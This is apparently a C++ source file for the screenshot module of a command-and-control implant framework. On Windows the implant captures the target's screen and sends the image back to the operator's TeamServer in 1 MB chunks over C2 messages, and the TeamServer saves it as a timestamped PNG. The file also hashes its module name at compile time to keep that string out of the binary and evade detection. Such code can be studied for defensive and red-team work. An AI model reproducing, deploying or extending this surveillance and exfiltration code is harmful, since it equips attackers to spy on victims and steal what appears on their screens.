#include "ScreenShot.hpp"

#ifdef _WIN32
// https://github.com/apriorit/Screenshot_Desktop/tree/master
#include "ScreenShooter.h"
#endif

#include "Common.hpp"

#include <algorithm>
#include <cstring>
#include <chrono>
#include <sstream>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "screenShot";
constexpr unsigned long long moduleHash = djb2(moduleName);
constexpr std::size_t CHUNK_SIZE = 1 * 1024 * 1024;


#ifdef _WIN32
__declspec(dllexport) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}
#else
__attribute__((visibility("default"))) ScreenShot* ScreenShotConstructor() 
{
    return new ScreenShot();
}
#endif


ScreenShot::ScreenShot()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}


ScreenShot::~ScreenShot()
{
}


std::string ScreenShot::getInfo()
{
    std::string info;
    // TODO: add screenshot every x seconds with a recurringExec
#ifdef BUILD_TEAMSERVER
    info += "ScreenShot:\n";
    info += "Capture a screenshot and store it as a generated PNG TeamServer artifact.\n";
    info += "exemple:\n";
    info += "- screenShot\n";
    info += "- screenShot desktop.png\n";
#endif
    return info;
}


int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) 
    if (splitedCmd.size() >= 1 )
    {
        c2Message.set_instruction(splitedCmd[0]);    
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}


#define ERROR_OPEN_FILE 1
#define ERROR_CAPTURE_SCREEN 2

int ScreenShot::emitChunk(C2Message& c2RetMessage)
{
    if (m_screenshotBuffer.empty() || m_bytesSent >= m_screenshotBuffer.size())
        return 0;

    const std::size_t totalSize = m_screenshotBuffer.size();
    const std::size_t chunkSize = std::min(CHUNK_SIZE, totalSize - m_bytesSent);
    c2RetMessage.set_instruction(std::to_string(moduleHash));
    c2RetMessage.set_cmd("");
    c2RetMessage.set_uuid(m_taskUuid);
    c2RetMessage.set_outputfile(m_outputfile);
    c2RetMessage.set_args(m_bytesSent == 0 ? "0" : "1");
    c2RetMessage.set_data(m_screenshotBuffer.data() + m_bytesSent, chunkSize);

    m_bytesSent += chunkSize;
    if (m_bytesSent == totalSize)
    {
        c2RetMessage.set_returnvalue("Success");
        m_outputfile.clear();
        m_taskUuid.clear();
        m_screenshotBuffer.clear();
        m_bytesSent = 0;
    }
    else
    {
        c2RetMessage.set_returnvalue(std::to_string(m_bytesSent) + "/" + std::to_string(totalSize));
    }

    return 1;
}


int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_outputfile(c2Message.outputfile());
    c2RetMessage.set_args("0");

#ifdef _WIN32
    std::vector<unsigned char> dataScreen;
    ScreenShooter::CaptureScreen(dataScreen);

    if (dataScreen.empty())
    {
        c2RetMessage.set_errorCode(ERROR_CAPTURE_SCREEN);
        return 0;
    }

    m_outputfile = c2Message.outputfile();
    m_taskUuid = c2Message.uuid();
    m_screenshotBuffer.assign(dataScreen.begin(), dataScreen.end());
    m_bytesSent = 0;
    emitChunk(c2RetMessage);
#elif defined(C2CORE_BUILD_TESTS)
    if (!c2Message.data().empty())
    {
        m_outputfile = c2Message.outputfile();
        m_taskUuid = c2Message.uuid();
        m_screenshotBuffer = c2Message.data();
        m_bytesSent = 0;
        emitChunk(c2RetMessage);
    }
#endif

    return 0;
}


int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
        else if(errorCode==ERROR_CAPTURE_SCREEN)
            errorMsg = "Failed: screen capture returned no data";
    }
#endif
    return 0;
}


std::string getFilenameTimestamp() 
{
    auto now = std::chrono::system_clock::now();
    std::time_t now_time = std::chrono::system_clock::to_time_t(now);

    std::tm local_time;
#ifdef _WIN32
    localtime_s(&local_time, &now_time);
#else
    localtime_r(&now_time, &local_time);
#endif

    // Format the timestamp
    std::ostringstream oss;
    oss << std::put_time(&local_time, "%Y%m%d_%H%M%S");
    return oss.str();
}


int ScreenShot::recurringExec(C2Message& c2RetMessage) 
{
    return emitChunk(c2RetMessage);
}


// TODO save the screenshot in a pre defined directory
int ScreenShot::followUp(const C2Message &c2RetMessage)
{
#ifdef BUILD_TEAMSERVER
    if(!c2RetMessage.outputfile().empty())
        return 0;

    const std::string buffer = c2RetMessage.data();

    if(buffer.size()>0)
    {
        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".png";
        std::ofstream output(outputFile, std::ios::binary);
        output << buffer;
        output.close();
    }
#endif

    return 0;
}
